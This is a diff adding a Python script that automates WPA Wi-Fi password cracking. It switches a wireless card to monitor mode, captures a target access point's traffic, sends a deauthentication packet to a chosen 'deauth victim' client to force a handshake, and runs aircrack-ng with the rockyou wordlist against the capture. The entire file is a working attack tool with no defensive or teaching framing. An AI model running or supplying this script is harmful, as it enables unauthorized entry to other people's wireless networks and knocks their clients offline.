@@ -1,0 +1,66 @@
+import subprocess
+import time
+
+
+find_router = "iw dev"
+scan = "sudo iw dev wlan0 scan"
+wifi_down = "sudo ip link set dev wlan0 down"
+monitor_mode = "sudo iw dev wlan0 set type monitor"
+wifi_up = "sudo ip link set dev wlan0 up"
+check_kill = "sudo airmon-ng check kill"
+check_info = "sudo iw dev wlan0 info"
+capture_traffic = "sudo airodump-ng wlan0"
+
+# Define the command to execute
+
+def command(cmd):
+    try:
+        # Run the command
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
+    
+        # Print the command's output
+        print("Command output:")
+        print(result.stdout)
+    except KeyboardInterrupt:
+        print(f"Subprocess stopped but continuing with the script...")
+
+
+def open_new_terminal(command):
+    subprocess.run(['qterminal', '--execute', f'bash -c "{command}; exec bash"'])
+
+def cont():
+    ent = input("\n PRESS ENTER TO CONTINUE \n")
+
+command(find_router)
+
+cont()
+
+command(scan)
+
+ap_mac = input("Enter AP MAC ID: ")
+
+command(wifi_down)
+
+cont()
+
+command(monitor_mode)
+
+cont()
+
+command(wifi_up)
+
+cont()
+
+command(check_kill)
+
+channel = input("Enter Channel number: ")
+
+command(f"sudo airodump-ng -c {channel} --bssid {ap_mac} -w output-file wlan0")
+
+client_mac = input("Enter MAC of deauth victim: ")
+
+open_new_terminal(f"sudo aireplay-ng -0 1 -a {ap_mac}-c {client_mac} wlan0")
+
+command(f"sudo aircrack-ng -a 2 -b {ap_mac} -w /home/glitch/rockyou.txt output*cap")
+
+
